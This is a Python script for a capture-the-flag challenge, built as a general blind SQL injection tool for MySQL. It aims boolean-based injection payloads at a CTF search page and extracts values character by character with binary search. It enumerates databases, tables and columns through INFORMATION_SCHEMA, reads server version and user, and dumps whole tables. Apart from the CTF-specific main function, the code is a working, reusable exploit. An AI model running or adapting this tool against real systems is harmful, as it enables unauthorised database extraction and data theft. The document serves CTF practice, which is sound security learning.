import requests
import math
import re

class MySqli:
    """Utility class for extracting data through blind sql injection.
        
    :param successFunction: a target-specific function that returns True when the injected query returns rows or False when it does not
    """

    utf8_alphabet = list(map(lambda x : chr(x), range(32,127)))     # Alphabet used for binary searching characters - must be in collation order.

    def __init__ (self, successFunction):
        self.checkSuccess = successFunction

    @staticmethod 
    def escapeWildcards(chr):
        """Escapes a character if it is a LIKE wildcard."""
        return "\\" + chr if chr in "%_[]^-" else chr

    @staticmethod
    def escapeSqlChr(chr):
        """Escapes a character for inclusion in an SQL string."""
        return "\\" + chr if chr in "\\'" else chr

    def getValue(self, getExpr, fromExpr = 'dual', alphabet = utf8_alphabet, maxLength = 100):
        """
        Get a value from a mysql expression.

        :param getExpr: A literal expression or column name found in `fromExpr`.
        :param fromExpr: (optional) When `getExpr` is a column name, this must be an SQL statement that returns the column. 
        :param alphabet: (optional) The character set used to search the value. If a value uses a known range of characters (e.g. only numbers) you can speed up searching by using a reduced alphabet. Must be in UTF8MB4_BIN collation order.
        :param maxLength: (optional) The maximum length of the value to retrieve
        :returns: str value.
        """

        # Function to find a single character at position charPos using a recursive binary search
        def findChar(charPos, alphabet = self.utf8_alphabet):
            p = math.floor(len(alphabet)/2)
            c = alphabet[p]

            print(f"\r'{string + c}{'_' * (length - len(string) - 1)}'", end="\r")
            
            if self.checkSuccess(f"' OR EXISTS(SELECT 1 FROM {fromExpr} WHERE SUBSTRING({getExpr}, {charPos+1}, 1) < _utf8mb4 '{ self.escapeSqlChr(c) }' COLLATE utf8mb4_bin);-- "): 
                return findChar(charPos, alphabet[:p])
            elif self.checkSuccess(f"' OR EXISTS(SELECT 1 FROM {fromExpr} WHERE SUBSTRING({getExpr}, {charPos+1}, 1) > _utf8mb4 '{ self.escapeSqlChr(c) }' COLLATE utf8mb4_bin);-- "): 
                return findChar(charPos, alphabet[p:])
            else:
                return c
        
        fromExpr = re.sub(r"^\s*(SELECT.*)$", r"(\1) AS x", fromExpr, flags = re.IGNORECASE)    # if the expression is a select statement, wrap it as a subquery

        string = ""
        length = 0
        
        # Find the length of the value
        for i in range(0,maxLength):
            if self.checkSuccess(f"' OR EXISTS(SELECT 1 FROM {fromExpr} WHERE {getExpr} LIKE '{ '_' * i }%');-- "):
                length = i
                print(f"\r'{'_' * i}' ", end="\r")
            else:
                break

        # Find the character at each position
        for i in range(0,length):
            string += findChar(i)
                    
        return string

    def getRowCount(self, fromExpression, maxRows = 100): 
        """
        Gets the number of rows returned by a mysql statement.

        :param fromExpression: A table name or SQL statement to count rows from.
        :param maxRows: (optional) The maximum number of rows to check for
        :returns: integer count.
        """
        
        fromExpression = re.sub(r"^\s*(SELECT.*)$", r"(\1) AS x", fromExpression, flags = re.IGNORECASE)    # if the expression is a select statement, wrap it as a subquery
        
        count = 0

        # Find the number of rows
        for i in range(0,maxRows):
            print(f"\r{i} ", end="\r")

            if not self.checkSuccess(f"' OR (SELECT COUNT(*) FROM {fromExpression}) > {i};-- "):
                count = i
                break
        
        return count

    def getDatabaseNames(self): 
        """Get database names the user has access to."""

        names = []
        count = self.getRowCount("SELECT 1 FROM INFORMATION_SCHEMA.SCHEMATA")   # Find how many databases the user has access to
        
        print (f"User has access to {count} databases.")

        # Find the name of each database
        if count > 0:
            for d in range (1,count+1):
                names.append(self.getDatabaseName(d))

        return names

    def getDatabaseName(self, ordinal = 1):
        """Get the name of the nth database the user has access to (ordered by name)."""

        # Database names are found in INFORMATION_SCHEMA.SCHEMATA.SCHEMA_NAME
        string = self.getValue("SCHEMA_NAME", f"SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA ORDER BY SCHEMA_NAME LIMIT 1 OFFSET {ordinal - 1}")
        
        print (f"Database {ordinal} Name is '{string}'")
        return string

    def getTableNames(self, databaseName):
        """Get table names for the specified database."""
        
        names = []
        count = self.getRowCount(f"SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{databaseName}'")  # Find how many tables are in the database

        print(f"Database '{databaseName}' has {count} tables. ")

        # Find the name of each table
        if count > 0:
            for t in range (1,count+1):
                names.append(self.getTableName(databaseName, t))

        return names

    def getTableName(self, databaseName, ordinal = 1):
        """Get the name of the nth table in the specified database (ordered by name)."""

        # Table names are found in INFORMATION_SCHEMA.TABLES.TABLE_NAME
        string = self.getValue("TABLE_NAME", f"SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{databaseName}' ORDER BY TABLE_NAME LIMIT 1 OFFSET {ordinal - 1}")

        print (f"Table {ordinal} Name is '{string}'")
        return string

    def getColumns(self, databaseName, tableName):
        """Get the column names & types for the specified table."""
        
        names = []
        types = []

        # Find how many columns are in the table
        count = self.getRowCount(f"SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{databaseName}' AND TABLE_NAME = '{tableName}'")  
               
        print(f"Table {databaseName}.{tableName} has {count} columns. ")

        # Find the name and data type for each column
        if count > 0:
            for c in range (1,count+1):
                names.append(self.getColumnName(databaseName, tableName, c))
                types.append(self.getColumnType(databaseName, tableName, c))

        #return name/type info as a list of tuples
        cols = list(zip(names, types))
        
        return cols

    def getColumnName(self, databaseName, tableName, ordinal):
        """Get the name of the nth column in the specified table."""

        # Column names are found in INFORMATION_SCHEMA.COLUMNS.COLUMN_NAME
        string = self.getValue("COLUMN_NAME", f"SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{databaseName}' AND TABLE_NAME = '{tableName}' AND ORDINAL_POSITION = {ordinal}")
        
        print(f"Column {ordinal} Name is '{string}'")
        return string

    def getColumnType(self, databaseName, tableName, ordinal):
        """Get the type of the nth column in the specified table."""
        
        # Column types are found in INFORMATION_SCHEMA.COLUMNS.DATA_TYPE
        string = self.getValue("DATA_TYPE", f"SELECT DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{databaseName}' AND TABLE_NAME = '{tableName}' AND ORDINAL_POSITION = {ordinal}")
        
        print(f"Column {ordinal} Type is {string}")
        return string
    
    def getColumnTypeFast(self, databaseName, tableName, ordinal):
        """Get the type of the nth column in the specified table."""

        # Instead of finding the type char-by-char we can just search through the list of known data types to save time.
        for columnType in ["INTEGER","INT","CHAR","VARCHAR","DATETIME","FLOAT","REAL","DOUBLE","DECIMAL","BIGINT","MEDIUMINT","SMALLINT","TINYINT","NUMERIC","BIT","TIMESTAMP","DATE","TIME","YEAR","BINARY","VARBINARY","BLOB","TEXT","ENUM","SET","JSON","POINT","LINESTRING", "POLYGON", "MULTIPOINT", "MULTILINESTRING", "MULTIPOLYGON", "GEOMETRYCOLLECTION" ]:
            print(f"\rColumn {ordinal} Type is {columnType}              ", end="\r")
            if self.checkSuccess(f"' OR EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{databaseName}' AND TABLE_NAME = '{tableName}' AND ORDINAL_POSITION = {ordinal} AND DATA_TYPE LIKE '{columnType}%');-- "):
                print(f"Column {ordinal} Type is {columnType}")
                return columnType

    def getRowValues(self, databaseName, tableName, columns):
        """Get the values from the specified columns in the specified table, row-by-row"""
        
        count = self.getRowCount(f"SELECT 1 FROM {databaseName}.{tableName}")   # Find how many rows there are to read
        rows = []
        
        print(f"Table '{tableName}' has {count} rows. ")

        # For each row
        if count > 0:
            for r in range (1,count+1):
                values = []
                # Find the value of each column on this row
                for c in range(0, len(columns)):
                    values.append(self.getColumnValue(databaseName, tableName, columns[c], r))
                rows.append(values[:]) # Return the values as a list of lists (a list for each row)
        
        return values

    def getColumnValues(self, databaseName, tableName, column):
        """Get all the values from the specified column in the specified table"""
        
        count = self.getRowCount(f"SELECT 1 FROM {databaseName}.{tableName}")   # Find how many rows there are to read
        values = []

        print(f"Table '{tableName}' has {count} rows. ")

        # Find the value for each row
        if count > 0:
            for t in range (1,count+1):
                values.append(self.getColumnValue(databaseName, tableName, column, t))

        return values

    def getColumnValue(self, databaseName, tableName, column, row):
        """Get the value from the specified column and row"""

        columnName = column[0]
        columnType = column[1]

        # If the column is a numeric type we can use a reduced alphabet to speed up searching
        if columnType.upper() in ["INTEGER","INT","FLOAT","REAL","DOUBLE","DECIMAL","BIGINT","MEDIUMINT","SMALLINT","TINYINT","NUMERIC","BIT"]:
            alphabet = "-.0123456789"
        else:
            alphabet = self.utf8_alphabet

        string = self.getValue(columnName, f"SELECT {columnName} FROM {databaseName}.{tableName} LIMIT 1 OFFSET {row-1}", alphabet = alphabet)

        print(f"Row {row} '{columnName}' = {string}")
        return string

    def dumpTable(self, databaseName, tableName):
        """Get all the data with column names/types from the specified table"""

        columns = self.getColumns(databaseName, tableName)
        rows = self.getRowValues(databaseName, tableName, columns)

        return (columns, rows)

def main():
    
    def checkSuccess(data):
            """Returns True if the provided post data returns rows, or False if it did not.

            If the response contains "found!" we know the query returned rows.
            We can use this to perform simple true/false tests against data on the server by injecting queries that return rows if a condition is true.

            We know the following from testing the webpage:
                When the query returns rows, the response will contain the text "# bagel(s) found!"
                When the query returns no rows, the response will contain the text "Sorry we don't seem to have those bagels... :("
                When we try to inject a query and it causes an error, the response will contain the text "SQL query syntax error"
            """

            url = 'http://problems.getpwning.com:7007/search.php'
            postData = {'bagel': data}

            r = requests.post(url, postData)
            
            # Break into the debugger if the query caused an error, so we can fix it.
            try:
                assert('SQL query syntax error' not in r.text)
            except:
                breakpoint()

            return True if 'found!' in r.text else False

    def columnContainsFlag(databaseName, tableName, columnName):
        """Check if the specified column contains any flag-like values: 'CTF{<something>}'"""
        
        return True if mysqli.getRowCount(f"SELECT 1 FROM {databaseName}.{tableName} WHERE {columnName} LIKE 'CTF{{%}}'") > 0 else False

    def getFlag(databaseName, tableName, columnName):
        """Get the flag value from the specified column"""

        return mysqli.getValue(columnName, f"SELECT {columnName} FROM {databaseName}.{tableName} WHERE {columnName} LIKE 'CTF{{%}}' LIMIT 1")

    def findFlag():
        """Search through the available databases looking for a flag value"""

        databases = mysqli.getDatabaseNames()
        print (f"User has access to databases {databases}")
        for databaseName in databases:
            tables = mysqli.getTableNames(databaseName)
            print (f"Database {databaseName} contains tables {tables}")
            for tableName in tables:
                columns = mysqli.getColumns(databaseName, tableName)
                print (f"Table {databaseName}.{tableName} contains columns {columns}")
                for column in columns:
                    if columnContainsFlag(databaseName, tableName, column[0]):
                        print(f"Column '{column[0]}' contains a flag-like value")
                        flag = getFlag(databaseName, tableName, column[0])
                        return flag
                    else:
                        print(f"Column '{column[0]}' does not contain a flag-like value")

    
    def serverInfo():
        """Get the server version info and user name as an example of evaluating expressions"""

        values = {}
        for expr in ["@@VERSION", "@@VERSION_COMMENT", "USER()", "CURRENT_USER()", "DATABASE()"]:
            value = mysqli.getValue(expr)
            print(f"{expr} = {value}")
            values[expr] = value
        return values
    
    mysqli = MySqli(checkSuccess)

    print(f"Flag is: {findFlag()}")

    #print(serverInfo())
    #bagels = mysqli.dumpTable('bageldb','bagels')
    #print(bagels[0])
    #print(bagels[1])

if __name__ == "__main__":
    main()
